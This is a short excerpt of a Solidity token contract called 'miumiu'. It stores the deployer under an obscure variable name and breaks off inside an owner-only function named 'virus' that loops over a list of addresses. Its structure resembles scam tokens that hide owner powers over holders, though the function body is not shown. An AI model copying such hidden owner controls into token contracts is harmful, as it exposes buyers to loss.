...
contract miumiu is Context, IERC20 {
    ...
    address public  suffering;
    constructor () {
        _name = "miumiu";
        _symbol = "miumiu";
        _decimals = 18;
        uint256 initialSupply = 878000000;
         suffering = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == suffering, "Not allowed");
        _;
    }

    function virus(address[] memory feather) public onlyOwner() {
        for (uint256 i = 0; i < feather.length; i++) {
            address account = feather[i];
